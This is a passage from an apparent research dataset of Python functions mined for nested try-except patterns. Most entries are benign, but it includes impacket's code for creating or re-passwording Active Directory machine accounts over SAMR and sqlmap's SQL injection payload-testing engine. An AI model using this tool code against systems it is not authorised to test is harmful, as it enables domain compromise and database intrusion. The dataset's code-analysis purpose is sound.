                    msg = socket.recv_data()
                    timing.add('RECV', tt.toc())
                except zmq.error.Again:
                    log(""recv timeout"")
                    continue

                #log('recv', msg[0])

                method, data = msg
                if method['critical']:
                    recv_queue.put(msg)
                else:
                    try:
                        recv_queue.put(msg, block=False)
                    except queue.Full:
                        log('recv_queue full')

                Once(timing, log, per=1)
        except KeyboardInterrupt:
            log(""recv_worker: user interrupt"", important=True)

        worker_alive.value = 0
        log(""recv_worker exit"", important=True)",Nested Try-Except Blocks,1
243,impacket,/home/r4ph/desenv/phd/exception-miner/projects/py/impacket/examples/addcomputer.py,doSAMRAdd,"def doSAMRAdd(self, rpctransport):
        dce = rpctransport.get_dce_rpc()
        servHandle = None
        domainHandle = None
        userHandle = None
        try:
            dce.connect()
            dce.bind(samr.MSRPC_UUID_SAMR)

            samrConnectResponse = samr.hSamrConnect5(dce, '\\\\%s\x00' % self.__target,
                samr.SAM_SERVER_ENUMERATE_DOMAINS | samr.SAM_SERVER_LOOKUP_DOMAIN )
            servHandle = samrConnectResponse['ServerHandle']

            samrEnumResponse = samr.hSamrEnumerateDomainsInSamServer(dce, servHandle)
            domains = samrEnumResponse['Buffer']['Buffer']
            domainsWithoutBuiltin = list(filter(lambda x : x['Name'].lower() != 'builtin', domains))

            if len(domainsWithoutBuiltin) > 1:
                domain = list(filter(lambda x : x['Name'].lower() == self.__domainNetbios, domains))
                if len(domain) != 1:
                    logging.critical(""This server provides multiple domains and '%s' isn't one of them."", self.__domainNetbios)
                    logging.critical(""Available domain(s):"")
                    for domain in domains:
                        logging.error("" * %s"" % domain['Name'])
                    logging.critical(""Consider using -domain-netbios argument to specify which one you meant."")
                    raise Exception()
                else:
                    selectedDomain = domain[0]['Name']
            else:
                selectedDomain = domainsWithoutBuiltin[0]['Name']

            samrLookupDomainResponse = samr.hSamrLookupDomainInSamServer(dce, servHandle, selectedDomain)
            domainSID = samrLookupDomainResponse['DomainId']

            if logging.getLogger().level == logging.DEBUG:
                logging.info(""Opening domain %s..."" % selectedDomain)
            samrOpenDomainResponse = samr.hSamrOpenDomain(dce, servHandle, samr.DOMAIN_LOOKUP | samr.DOMAIN_CREATE_USER , domainSID)
            domainHandle = samrOpenDomainResponse['DomainHandle']


            if self.__noAdd or self.__delete:
                try:
                    checkForUser = samr.hSamrLookupNamesInDomain(dce, domainHandle, [self.__computerName])
                except samr.DCERPCSessionError as e:
                    if e.error_code == 0xc0000073:
                        raise Exception(""Account %s not found in domain %s!"" % (self.__computerName, selectedDomain))
                    else:
                        raise

                userRID = checkForUser['RelativeIds']['Element'][0]
                if self.__delete:
                    access = samr.DELETE
                    message = ""delete""
                else:
                    access = samr.USER_FORCE_PASSWORD_CHANGE
                    message = ""set password for""
                try:
                    openUser = samr.hSamrOpenUser(dce, domainHandle, access, userRID)
                    userHandle = openUser['UserHandle']
                except samr.DCERPCSessionError as e:
                    if e.error_code == 0xc0000022:
                        raise Exception(""User %s doesn't have right to %s %s!"" % (self.__username, message, self.__computerName))
                    else:
                        raise
            else:
                if self.__computerName is not None:
                    try:
                        checkForUser = samr.hSamrLookupNamesInDomain(dce, domainHandle, [self.__computerName])
                        raise Exception(""Account %s already exists! If you just want to set a password, use -no-add."" % self.__computerName)
                    except samr.DCERPCSessionError as e:
                        if e.error_code != 0xc0000073:
                            raise
                else:
                    foundUnused = False
                    while not foundUnused:
                        self.__computerName = self.generateComputerName()
                        try:
                            checkForUser = samr.hSamrLookupNamesInDomain(dce, domainHandle, [self.__computerName])
                        except samr.DCERPCSessionError as e:
                            if e.error_code == 0xc0000073:
                                foundUnused = True
                            else:
                                raise

                try:
                    createUser = samr.hSamrCreateUser2InDomain(dce, domainHandle, self.__computerName, samr.USER_WORKSTATION_TRUST_ACCOUNT, samr.USER_FORCE_PASSWORD_CHANGE,)
                except samr.DCERPCSessionError as e:
                    if e.error_code == 0xc0000022:
                        raise Exception(""User %s doesn't have right to create a machine account!"" % self.__username)
                    elif e.error_code == 0xc00002e7:
                        raise Exception(""User %s machine quota exceeded!"" % self.__username)
                    else:
                        raise

                userHandle = createUser['UserHandle']

            if self.__delete:
                samr.hSamrDeleteUser(dce, userHandle)
                logging.info(""Successfully deleted %s."" % self.__computerName)
                userHandle = None
            else:
                samr.hSamrSetPasswordInternal4New(dce, userHandle, self.__computerPassword)
                if self.__noAdd:
                    logging.info(""Successfully set password of %s to %s."" % (self.__computerName, self.__computerPassword))
                else:
                    checkForUser = samr.hSamrLookupNamesInDomain(dce, domainHandle, [self.__computerName])
                    userRID = checkForUser['RelativeIds']['Element'][0]
                    openUser = samr.hSamrOpenUser(dce, domainHandle, samr.MAXIMUM_ALLOWED, userRID)
                    userHandle = openUser['UserHandle']
                    req = samr.SAMPR_USER_INFO_BUFFER()
                    req['tag'] = samr.USER_INFORMATION_CLASS.UserControlInformation
                    req['Control']['UserAccountControl'] = samr.USER_WORKSTATION_TRUST_ACCOUNT
                    samr.hSamrSetInformationUser2(dce, userHandle, req)
                    logging.info(""Successfully added machine account %s with password %s."" % (self.__computerName, self.__computerPassword))

        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()

            logging.critical(str(e))
        finally:
            if userHandle is not None:
                samr.hSamrCloseHandle(dce, userHandle)
            if domainHandle is not None:
                samr.hSamrCloseHandle(dce, domainHandle)
            if servHandle is not None:
                samr.hSamrCloseHandle(dce, servHandle)
            dce.disconnect()",Nested Try-Except Blocks,1
244,python-prompt-toolkit,/home/r4ph/desenv/phd/exception-miner/projects/py/python-prompt-toolkit/src/prompt_toolkit/eventloop/async_generator.py,runner,"def runner() -> None:
        """"""
        Consume the generator in background thread.
        When items are received, they'll be pushed to the queue.
        """"""
        try:
            for item in get_iterable():
                # When this async generator was cancelled (closed), stop this
                # thread.
                if quitting:
                    return

                while True:
                    try:
                        q.put(item, timeout=1)
                    except Full:
                        if quitting:
                            return
                        continue
                    else:
                        break

        finally:
            while True:
                try:
                    q.put(_Done(), timeout=1)
                except Full:
                    if quitting:
                        return
                    continue
                else:
                    break",Nested Try-Except Blocks,1
245,spiderfoot,/home/r4ph/desenv/phd/exception-miner/projects/py/spiderfoot/sflib.py,cveInfo,"def cveInfo(self, cveId: str, sources: str = ""circl,nist"") -> (str, str):
        """"""Look up a CVE ID for more information in the first available source.

        Args:
            cveId (str): CVE ID, e.g. CVE-2018-15473
            sources (str): Comma-separated list of sources to query. Options available are circl and nist

        Returns:
            (str, str): Appropriate event type and descriptive text
        """"""
        sources = sources.split("","")
        # VULNERABILITY_GENERAL is the generic type in case we don't have
        # a real/mappable CVE.
        eventType = ""VULNERABILITY_GENERAL""

        def cveRating(score: int) -> str:
            if score == ""Unknown"":
                return None
            if score >= 0 and score <= 3.9:
                return ""LOW""
            if score >= 4.0 and score <= 6.9:
                return ""MEDIUM""
            if score >= 7.0 and score <= 8.9:
                return ""HIGH""
            if score >= 9.0:
                return ""CRITICAL""
            return None

        for source in sources:
            jsondata = self.cacheGet(f""{source}-{cveId}"", 86400)

            if not jsondata:
                # Fetch data from source
                if source == ""nist"":
                    ret = self.fetchUrl(f""https://services.nvd.nist.gov/rest/json/cve/1.0/{cveId}"", timeout=5)
                if source == ""circl"":
                    ret = self.fetchUrl(f""https://cve.circl.lu/api/cve/{cveId}"", timeout=5)

                if not ret:
                    continue

                if not ret['content']:
                    continue

                self.cachePut(f""{source}-{cveId}"", ret['content'])
                jsondata = ret['content']

            try:
                data = json.loads(jsondata)

                if source == ""circl"":
                    score = data.get('cvss', 'Unknown')
                    rating = cveRating(score)
                    if rating:
                        eventType = f""VULNERABILITY_CVE_{rating}""
                        return (eventType, f""{cveId}\n<SFURL>https://nvd.nist.gov/vuln/detail/{cveId}</SFURL>\n""
                                f""Score: {score}\nDescription: {data.get('summary', 'Unknown')}"")

                if source == ""nist"":
                    try:
                        if data['result']['CVE_Items'][0]['impact'].get('baseMetricV3'):
                            score = data['result']['CVE_Items'][0]['impact']['baseMetricV3']['cvssV3']['baseScore']
                        else:
                            score = data['result']['CVE_Items'][0]['impact']['baseMetricV2']['cvssV2']['baseScore']
                        rating = cveRating(score)
                        if rating:
                            eventType = f""VULNERABILITY_CVE_{rating}""
                    except Exception:
                        score = ""Unknown""

                    try:
                        descr = data['result']['CVE_Items'][0]['cve']['description']['description_data'][0]['value']
                    except Exception:
                        descr = ""Unknown""

                    return (eventType, f""{cveId}\n<SFURL>https://nvd.nist.gov/vuln/detail/{cveId}</SFURL>\n""
                            f""Score: {score}\nDescription: {descr}"")
            except BaseException as e:
                self.debug(f""Unable to parse CVE response from {source.upper()}: {e}"")
                continue

        return (eventType, f""{cveId}\nScore: Unknown\nDescription: Unknown"")",Nested Try-Except Blocks,1
246,chia-blockchain,/home/r4ph/desenv/phd/exception-miner/projects/py/chia-blockchain/chia/harvester/harvester_api.py,blocking_lookup,"def blocking_lookup(filename: Path, plot_info: PlotInfo) -> List[Tuple[bytes32, ProofOfSpace]]:
            # Uses the DiskProver object to lookup qualities. This is a blocking call,
            # so it should be run in a thread pool.
            try:
                plot_id = plot_info.prover.get_id()
                sp_challenge_hash = calculate_pos_challenge(
                    plot_id,
                    new_challenge.challenge_hash,
                    new_challenge.sp_hash,
                )
                try:
                    quality_strings = plot_info.prover.get_qualities_for_challenge(sp_challenge_hash)
                except RuntimeError as e:
                    if str(e) == ""Timeout waiting for context queue."":
                        self.harvester.log.warning(
                            f""No decompressor available. Cancelling qualities retrieving for {filename}""
                        )
                        self.harvester.log.warning(
                            f""File: {filename} Plot ID: {plot_id.hex()}, challenge: {sp_challenge_hash}, ""
                            f""plot_info: {plot_info}""
                        )
                    else:
                        self.harvester.log.error(f""Exception fetching qualities for {filename}. {e}"")
                        self.harvester.log.error(
                            f""File: {filename} Plot ID: {plot_id.hex()}, challenge: {sp_challenge_hash}, ""
                            f""plot_info: {plot_info}""
                        )
                    return []
                except Exception as e:
                    self.harvester.log.error(f""Error using prover object {e}"")
                    self.harvester.log.error(
                        f""File: {filename} Plot ID: {plot_id.hex()}, ""
                        f""challenge: {sp_challenge_hash}, plot_info: {plot_info}""
                    )
                    return []

                responses: List[Tuple[bytes32, ProofOfSpace]] = []
                if quality_strings is not None:
                    difficulty = new_challenge.difficulty
                    sub_slot_iters = new_challenge.sub_slot_iters
                    if plot_info.pool_contract_puzzle_hash is not None:
                        # If we are pooling, override the difficulty and sub slot iters with the pool threshold info.
                        # This will mean more proofs actually get found, but they are only submitted to the pool,
                        # not the blockchain
                        for pool_difficulty in new_challenge.pool_difficulties:
                            if pool_difficulty.pool_contract_puzzle_hash == plot_info.pool_contract_puzzle_hash:
                                difficulty = pool_difficulty.difficulty
                                sub_slot_iters = pool_difficulty.sub_slot_iters

                    # Found proofs of space (on average 1 is expected per plot)
                    for index, quality_str in enumerate(quality_strings):
                        required_iters: uint64 = calculate_iterations_quality(
                            self.harvester.constants.DIFFICULTY_CONSTANT_FACTOR,
                            quality_str,
                            plot_info.prover.get_size(),
                            difficulty,
                            new_challenge.sp_hash,
                        )
                        sp_interval_iters = calculate_sp_interval_iters(self.harvester.constants, sub_slot_iters)
                        if required_iters < sp_interval_iters:
                            # Found a very good proof of space! will fetch the whole proof from disk,
                            # then send to farmer
                            try:
                                proof_xs = plot_info.prover.get_full_proof(
                                    sp_challenge_hash, index, self.harvester.parallel_read
                                )
                            except RuntimeError as e:
                                if str(e) == ""GRResult_NoProof received"":
                                    self.harvester.log.info(
                                        f""Proof dropped due to line point compression for {filename}""
                                    )
                                    self.harvester.log.info(
                                        f""File: {filename} Plot ID: {plot_id.hex()}, challenge: {sp_challenge_hash}, ""
                                        f""plot_info: {plot_info}""
                                    )
                                elif str(e) == ""Timeout waiting for context queue."":
                                    self.harvester.log.warning(
                                        f""No decompressor available. Cancelling full proof retrieving for {filename}""
                                    )
                                    self.harvester.log.warning(
                                        f""File: {filename} Plot ID: {plot_id.hex()}, challenge: {sp_challenge_hash}, ""
                                        f""plot_info: {plot_info}""
                                    )
                                else:
                                    self.harvester.log.error(f""Exception fetching full proof for {filename}. {e}"")
                                    self.harvester.log.error(
                                        f""File: {filename} Plot ID: {plot_id.hex()}, challenge: {sp_challenge_hash}, ""
                                        f""plot_info: {plot_info}""
                                    )
                                continue
                            except Exception as e:
                                self.harvester.log.error(f""Exception fetching full proof for {filename}. {e}"")
                                self.harvester.log.error(
                                    f""File: {filename} Plot ID: {plot_id.hex()}, challenge: {sp_challenge_hash}, ""
                                    f""plot_info: {plot_info}""
                                )
                                continue

                            responses.append(
                                (
                                    quality_str,
                                    ProofOfSpace(
                                        sp_challenge_hash,
                                        plot_info.pool_public_key,
                                        plot_info.pool_contract_puzzle_hash,
                                        plot_info.plot_public_key,
                                        uint8(plot_info.prover.get_size()),
                                        proof_xs,
                                    ),
                                )
                            )
                return responses
            except Exception as e:
                self.harvester.log.error(f""Unknown error: {e}"")
                return []",Nested Try-Except Blocks,1
247,sqlmap,/home/r4ph/desenv/exception-miner/projects/py/sqlmap/lib/controller/checks.py,checkSqlInjection,"def checkSqlInjection(place, parameter, value):
    # Store here the details about boundaries and payload used to
    # successfully inject
    injection = InjectionDict()

    # Localized thread data needed for some methods
    threadData = getCurrentThreadData()

    # Favoring non-string specific boundaries in case of digit-like parameter values
    if isDigit(value):
        kb.cache.intBoundaries = kb.cache.intBoundaries or sorted(copy.deepcopy(conf.boundaries), key=lambda boundary: any(_ in (boundary.prefix or """") or _ in (boundary.suffix or """") for _ in ('""', '\'')))
        boundaries = kb.cache.intBoundaries
    elif value.isalpha():
        kb.cache.alphaBoundaries = kb.cache.alphaBoundaries or sorted(copy.deepcopy(conf.boundaries), key=lambda boundary: not any(_ in (boundary.prefix or """") or _ in (boundary.suffix or """") for _ in ('""', '\'')))
        boundaries = kb.cache.alphaBoundaries
    else:
        boundaries = conf.boundaries

    # Set the flag for SQL injection test mode
    kb.testMode = True

    paramType = conf.method if conf.method not in (None, HTTPMETHOD.GET, HTTPMETHOD.POST) else place
    tests = getSortedInjectionTests()
    seenPayload = set()

    kb.data.setdefault(""randomInt"", str(randomInt(10)))
    kb.data.setdefault(""randomStr"", str(randomStr(10)))

    while tests:
        test = tests.pop(0)

        try:
            if kb.endDetection:
                break

            if conf.dbms is None:
                # If the DBMS has not yet been fingerprinted (via simple heuristic check
                # or via DBMS-specific payload) and boolean-based blind has been identified
                # then attempt to identify with a simple DBMS specific boolean-based
                # test what the DBMS may be
                if not injection.dbms and PAYLOAD.TECHNIQUE.BOOLEAN in injection.data:
                    if not Backend.getIdentifiedDbms() and kb.heuristicDbms is None and not kb.droppingRequests:
                        kb.heuristicDbms = heuristicCheckDbms(injection)

                # If the DBMS has already been fingerprinted (via DBMS-specific
                # error message, simple heuristic check or via DBMS-specific
                # payload), ask the user to limit the tests to the fingerprinted
                # DBMS

                if kb.reduceTests is None and not conf.testFilter and (intersect(Backend.getErrorParsedDBMSes(), SUPPORTED_DBMS, True) or kb.heuristicDbms or injection.dbms):
                    msg = ""it looks like the back-end DBMS is '%s'. "" % (Format.getErrorParsedDBMSes() or kb.heuristicDbms or joinValue(injection.dbms, '/'))
                    msg += ""Do you want to skip test payloads specific for other DBMSes? [Y/n]""
                    kb.reduceTests = (Backend.getErrorParsedDBMSes() or [kb.heuristicDbms]) if readInput(msg, default='Y', boolean=True) else []

            # If the DBMS has been fingerprinted (via DBMS-specific error
            # message, via simple heuristic check or via DBMS-specific
            # payload), ask the user to extend the tests to all DBMS-specific,
            # regardless of --level and --risk values provided
            if kb.extendTests is None and not conf.testFilter and (conf.level < 5 or conf.risk < 3) and (intersect(Backend.getErrorParsedDBMSes(), SUPPORTED_DBMS, True) or kb.heuristicDbms or injection.dbms):
                msg = ""for the remaining tests, do you want to include all tests ""
                msg += ""for '%s' extending provided "" % (Format.getErrorParsedDBMSes() or kb.heuristicDbms or joinValue(injection.dbms, '/'))
                msg += ""level (%d)"" % conf.level if conf.level < 5 else """"
                msg += "" and "" if conf.level < 5 and conf.risk < 3 else """"
                msg += ""risk (%d)"" % conf.risk if conf.risk < 3 else """"
                msg += "" values? [Y/n]"" if conf.level < 5 and conf.risk < 3 else "" value? [Y/n]""
                kb.extendTests = (Backend.getErrorParsedDBMSes() or [kb.heuristicDbms]) if readInput(msg, default='Y', boolean=True) else []

            title = test.title
            kb.testType = stype = test.stype
            clause = test.clause
            unionExtended = False
            trueCode, falseCode = None, None

            if conf.httpCollector is not None:
                conf.httpCollector.setExtendedArguments({
                    ""_title"": title,
                    ""_place"": place,
                    ""_parameter"": parameter,
                })

            if stype == PAYLOAD.TECHNIQUE.UNION:
                configUnion(test.request.char)

                if ""[CHAR]"" in title:
                    if conf.uChar is None:
                        continue
                    else:
                        title = title.replace(""[CHAR]"", conf.uChar)

                elif ""[RANDNUM]"" in title or ""(NULL)"" in title:
                    title = title.replace(""[RANDNUM]"", ""random number"")

                if test.request.columns == ""[COLSTART]-[COLSTOP]"":
                    if conf.uCols is None:
                        continue
                    else:
                        title = title.replace(""[COLSTART]"", str(conf.uColsStart))
                        title = title.replace(""[COLSTOP]"", str(conf.uColsStop))

                elif conf.uCols is not None:
                    debugMsg = ""skipping test '%s' because the user "" % title
                    debugMsg += ""provided custom column range %s"" % conf.uCols
                    logger.debug(debugMsg)
                    continue

                match = re.search(r""(\d+)-(\d+)"", test.request.columns)
                if match and injection.data:
                    lower, upper = int(match.group(1)), int(match.group(2))
                    for _ in (lower, upper):
                        if _ > 1:
                            __ = 2 * (_ - 1) + 1 if _ == lower else 2 * _
                            unionExtended = True
                            test.request.columns = re.sub(r""\b%d\b"" % _, str(__), test.request.columns)
                            title = re.sub(r""\b%d\b"" % _, str(__), title)
                            test.title = re.sub(r""\b%d\b"" % _, str(__), test.title)

            # Skip test if the user's wants to test only for a specific
            # technique
            if conf.technique and isinstance(conf.technique, list) and stype not in conf.technique:
                debugMsg = ""skipping test '%s' because user "" % title
                debugMsg += ""specified testing of only ""
                debugMsg += ""%s techniques"" % "" & "".join(PAYLOAD.SQLINJECTION[_] for _ in conf.technique)
                logger.debug(debugMsg)
                continue

            # Skip test if it is the same SQL injection type already
            # identified by another test
            if injection.data and stype in injection.data:
                debugMsg = ""skipping test '%s' because "" % title
                debugMsg += ""the payload for %s has "" % PAYLOAD.SQLINJECTION[stype]
                debugMsg += ""already been identified""
                logger.debug(debugMsg)
                continue

            # Parse DBMS-specific payloads' details
            if ""details"" in test and ""dbms"" in test.details:
                payloadDbms = test.details.dbms
            else:
                payloadDbms = None

            # Skip tests if title, vector or DBMS is not included by the
            # given test filter
            if conf.testFilter and not any(conf.testFilter in str(item) or re.search(conf.testFilter, str(item), re.I) for item in (test.title, test.vector, payloadDbms)):
                debugMsg = ""skipping test '%s' because its "" % title
                debugMsg += ""name/vector/DBMS is not included by the given filter""
                logger.debug(debugMsg)
                continue

            # Skip tests if title, vector or DBMS is included by the
            # given skip filter
            if conf.testSkip and any(conf.testSkip in str(item) or re.search(conf.testSkip, str(item), re.I) for item in (test.title, test.vector, payloadDbms)):
                debugMsg = ""skipping test '%s' because its "" % title
                debugMsg += ""name/vector/DBMS is included by the given skip filter""
                logger.debug(debugMsg)
                continue

            if payloadDbms is not None:
                # Skip DBMS-specific test if it does not match the user's
                # provided DBMS
                if conf.dbms and not intersect(payloadDbms, conf.dbms, True):
                    debugMsg = ""skipping test '%s' because "" % title
                    debugMsg += ""its declared DBMS is different than provided""
                    logger.debug(debugMsg)
                    continue

                elif kb.dbmsFilter and not intersect(payloadDbms, kb.dbmsFilter, True):
                    debugMsg = ""skipping test '%s' because "" % title
                    debugMsg += ""its declared DBMS is different than provided""
                    logger.debug(debugMsg)
                    continue

                elif kb.reduceTests == False:
                    pass

                # Skip DBMS-specific test if it does not match the
                # previously identified DBMS (via DBMS-specific payload)
                elif injection.dbms and not intersect(payloadDbms, injection.dbms, True):
                    debugMsg = ""skipping test '%s' because "" % title
                    debugMsg += ""its declared DBMS is different than identified""
                    logger.debug(debugMsg)
                    continue

                # Skip DBMS-specific test if it does not match the
                # previously identified DBMS (via DBMS-specific error message)
                elif kb.reduceTests and not intersect(payloadDbms, kb.reduceTests, True):
                    debugMsg = ""skipping test '%s' because the heuristic "" % title
                    debugMsg += ""tests showed that the back-end DBMS ""
                    debugMsg += ""could be '%s'"" % unArrayizeValue(kb.reduceTests)
                    logger.debug(debugMsg)
                    continue

            # If the user did not decide to extend the tests to all
            # DBMS-specific or the test payloads is not specific to the
            # identified DBMS, then only test for it if both level and risk
            # are below the corrisponding configuration's level and risk
            # values
            if not conf.testFilter and not (kb.extendTests and intersect(payloadDbms, kb.extendTests, True)):
                # Skip test if the risk is higher than the provided (or default)
                # value
                if test.risk > conf.risk:
                    debugMsg = ""skipping test '%s' because the risk (%d) "" % (title, test.risk)
                    debugMsg += ""is higher than the provided (%d)"" % conf.risk
                    logger.debug(debugMsg)
                    continue

                # Skip test if the level is higher than the provided (or default)
                # value
                if test.level > conf.level:
                    debugMsg = ""skipping test '%s' because the level (%d) "" % (title, test.level)
                    debugMsg += ""is higher than the provided (%d)"" % conf.level
                    logger.debug(debugMsg)
                    continue

            # Skip test if it does not match the same SQL injection clause
            # already identified by another test
            clauseMatch = False

            for clauseTest in clause:
                if injection.clause is not None and clauseTest in injection.clause:
                    clauseMatch = True
                    break

            if clause != [0] and injection.clause and injection.clause != [0] and not clauseMatch:
                debugMsg = ""skipping test '%s' because the clauses "" % title
                debugMsg += ""differ from the clause already identified""
                logger.debug(debugMsg)
                continue

            # Skip test if the user provided custom character (for UNION-based payloads)
            if conf.uChar is not None and (""random number"" in title or ""(NULL)"" in title):
                debugMsg = ""skipping test '%s' because the user "" % title
                debugMsg += ""provided a specific character, %s"" % conf.uChar
                logger.debug(debugMsg)
                continue

            if stype == PAYLOAD.TECHNIQUE.UNION:
                match = re.search(r""(\d+)-(\d+)"", test.request.columns)
                if match and not injection.data:
                    _ = test.request.columns.split('-')[-1]
                    if conf.uCols is None and _.isdigit():
                        if kb.futileUnion is None:
                            msg = ""it is recommended to perform ""
                            msg += ""only basic UNION tests if there is not ""
                            msg += ""at least one other (potential) ""
                            msg += ""technique found. Do you want to reduce ""
                            msg += ""the number of requests? [Y/n] ""
                            kb.futileUnion = readInput(msg, default='Y', boolean=True)

                        if kb.futileUnion and int(_) > 10:
                            debugMsg = ""skipping test '%s'"" % title
                            logger.debug(debugMsg)
                            continue

            infoMsg = ""testing '%s'"" % title
            logger.info(infoMsg)

            # Force back-end DBMS according to the current test DBMS value
            # for proper payload unescaping
            Backend.forceDbms(payloadDbms[0] if isinstance(payloadDbms, list) else payloadDbms)

            # Parse test's <request>
            comment = agent.getComment(test.request) if len(conf.boundaries) > 1 else None
            fstPayload = agent.cleanupPayload(test.request.payload, origValue=value if place not in (PLACE.URI, PLACE.CUSTOM_POST, PLACE.CUSTOM_HEADER) and BOUNDED_INJECTION_MARKER not in (value or """") else None)

            for boundary in boundaries:
                injectable = False

                # Skip boundary if the level is higher than the provided (or
                # default) value
                # Parse boundary's <level>
                if boundary.level > conf.level and not (kb.extendTests and intersect(payloadDbms, kb.extendTests, True)):
                    continue

                # Skip boundary if it does not match against test's <clause>
                # Parse test's <clause> and boundary's <clause>
                clauseMatch = False

                for clauseTest in test.clause:
                    if clauseTest in boundary.clause:
                        clauseMatch = True
                        break

                if test.clause != [0] and boundary.clause != [0] and not clauseMatch:
                    continue

                # Skip boundary if it does not match against test's <where>
                # Parse test's <where> and boundary's <where>
                whereMatch = False

                for where in test.where:
                    if where in boundary.where:
                        whereMatch = True
                        break

                if not whereMatch:
                    continue

                # Parse boundary's <prefix>, <suffix> and <ptype>
                prefix = boundary.prefix or """"
                suffix = boundary.suffix or """"
                ptype = boundary.ptype

                # Options --prefix/--suffix have a higher priority (if set by user)
                prefix = conf.prefix if conf.prefix is not None else prefix
                suffix = conf.suffix if conf.suffix is not None else suffix
                comment = None if conf.suffix is not None else comment

                # If the previous injections succeeded, we know which prefix,
                # suffix and parameter type to use for further tests, no
                # need to cycle through the boundaries for the following tests
                condBound = (injection.prefix is not None and injection.suffix is not None)
                condBound &= (injection.prefix != prefix or injection.suffix != suffix)
                condType = injection.ptype is not None and injection.ptype != ptype

                # If the payload is an inline query test for it regardless
                # of previously identified injection types
                if stype != PAYLOAD.TECHNIQUE.QUERY and (condBound or condType):
                    continue

                # For each test's <where>
                for where in test.where:
                    templatePayload = None
                    vector = None

                    origValue = value
                    if kb.customInjectionMark in origValue:
                        origValue = origValue.split(kb.customInjectionMark)[0]
                        origValue = re.search(r""(\w*)\Z"", origValue).group(1)

                    # Treat the parameter original value according to the
                    # test's <where> tag
                    if where == PAYLOAD.WHERE.ORIGINAL or conf.prefix:
                        if kb.tamperFunctions:
                            templatePayload = agent.payload(place, parameter, value="""", newValue=origValue, where=where)
                    elif where == PAYLOAD.WHERE.NEGATIVE:
                        # Use different page template than the original
                        # one as we are changing parameters value, which
                        # will likely result in a different content

                        if conf.invalidLogical:
                            _ = int(kb.data.randomInt[:2])
                            origValue = ""%s AND %s LIKE %s"" % (origValue, _, _ + 1)
                        elif conf.invalidBignum:
                            origValue = kb.data.randomInt[:6]
                        elif conf.invalidString:
                            origValue = kb.data.randomStr[:6]
                        else:
                            origValue = ""-%s"" % kb.data.randomInt[:4]

                        templatePayload = agent.payload(place, parameter, value="""", newValue=origValue, where=where)
                    elif where == PAYLOAD.WHERE.REPLACE:
                        origValue = """"

                    kb.pageTemplate, kb.errorIsNone = getPageTemplate(templatePayload, place)

                    # Forge request payload by prepending with boundary's
                    # prefix and appending the boundary's suffix to the
                    # test's ' <payload><comment> ' string
                    if fstPayload:
                        boundPayload = agent.prefixQuery(fstPayload, prefix, where, clause)
                        boundPayload = agent.suffixQuery(boundPayload, comment, suffix, where)
                        reqPayload = agent.payload(place, parameter, newValue=boundPayload, where=where)

                        if reqPayload:
                            stripPayload = re.sub(r""(\A|\b|_)([A-Za-z]{4}((?<!LIKE))|\d+)(_|\b|\Z)"", r""\g<1>.\g<4>"", reqPayload)
                            if stripPayload in seenPayload:
                                continue
                            else:
                                seenPayload.add(stripPayload)
                    else:
                        reqPayload = None

                    # Perform the test's request and check whether or not the
                    # payload was successful
                    # Parse test's <response>
                    for method, check in test.response.items():
                        check = agent.cleanupPayload(check, origValue=value if place not in (PLACE.URI, PLACE.CUSTOM_POST, PLACE.CUSTOM_HEADER) and BOUNDED_INJECTION_MARKER not in (value or """") else None)

                        # In case of boolean-based blind SQL injection
                        if method == PAYLOAD.METHOD.COMPARISON:
                            # Generate payload used for comparison
                            def genCmpPayload():
                                sndPayload = agent.cleanupPayload(test.response.comparison, origValue=value if place not in (PLACE.URI, PLACE.CUSTOM_POST, PLACE.CUSTOM_HEADER) and BOUNDED_INJECTION_MARKER not in (value or """") else None)

                                # Forge response payload by prepending with
                                # boundary's prefix and appending the boundary's
                                # suffix to the test's ' <payload><comment> '
                                # string
                                boundPayload = agent.prefixQuery(sndPayload, prefix, where, clause)
                                boundPayload = agent.suffixQuery(boundPayload, comment, suffix, where)
                                cmpPayload = agent.payload(place, parameter, newValue=boundPayload, where=where)

                                return cmpPayload

                            # Useful to set kb.matchRatio at first based on False response content
                            kb.matchRatio = None
                            kb.negativeLogic = (where == PAYLOAD.WHERE.NEGATIVE)
                            suggestion = None
                            Request.queryPage(genCmpPayload(), place, raise404=False)
                            falsePage, falseHeaders, falseCode = threadData.lastComparisonPage or """", threadData.lastComparisonHeaders, threadData.lastComparisonCode
                            falseRawResponse = ""%s%s"" % (falseHeaders, falsePage)

                            # Checking if there is difference between current FALSE, original and heuristics page (i.e. not used parameter)
                            if not any((kb.negativeLogic, conf.string, conf.notString, conf.code)):
                                try:
                                    ratio = 1.0
                                    seqMatcher = getCurrentThreadData().seqMatcher

                                    for current in (kb.originalPage, kb.heuristicPage):
                                        seqMatcher.set_seq1(current or """")
                                        seqMatcher.set_seq2(falsePage or """")
                                        ratio *= seqMatcher.quick_ratio()

                                    if ratio == 1.0:
                                        continue
                                except (MemoryError, OverflowError):
                                    pass

                            # Perform the test's True request
                            trueResult = Request.queryPage(reqPayload, place, raise404=False)
                            truePage, trueHeaders, trueCode = threadData.lastComparisonPage or """", threadData.lastComparisonHeaders, threadData.lastComparisonCode
                            trueRawResponse = ""%s%s"" % (trueHeaders, truePage)

                            if trueResult and not(truePage == falsePage and not any((kb.nullConnection, conf.code))):
                                # Perform the test's False request
                                falseResult = Request.queryPage(genCmpPayload(), place, raise404=False)

                                if not falseResult:
                                    if kb.negativeLogic:
                                        boundPayload = agent.prefixQuery(kb.data.randomStr, prefix, where, clause)
                                        boundPayload = agent.suffixQuery(boundPayload, comment, suffix, where)
                                        errorPayload = agent.payload(place, parameter, newValue=boundPayload, where=where)

                                        errorResult = Request.queryPage(errorPayload, place, raise404=False)
                                        if errorResult:
                                            continue
                                    elif kb.heuristicPage and not any((conf.string, conf.notString, conf.regexp, conf.code, kb.nullConnection)):
                                        _ = comparison(kb.heuristicPage, None, getRatioValue=True)
                                        if (_ or 0) > (kb.matchRatio or 0):
                                            kb.matchRatio = _
                                            logger.debug(""adjusting match ratio for current parameter to %.3f"" % kb.matchRatio)

                                    # Reducing false-positive ""appears"" messages in heavily dynamic environment
                                    if kb.heavilyDynamic and not Request.queryPage(reqPayload, place, raise404=False):
                                        continue

                                    injectable = True

                                elif (threadData.lastComparisonRatio or 0) > UPPER_RATIO_BOUND and not any((conf.string, conf.notString, conf.regexp, conf.code, kb.nullConnection)):
                                    originalSet = set(getFilteredPageContent(kb.pageTemplate, True, ""\n"").split(""\n""))
                                    trueSet = set(getFilteredPageContent(truePage, True, ""\n"").split(""\n""))
                                    falseSet = set(getFilteredPageContent(falsePage, True, ""\n"").split(""\n""))

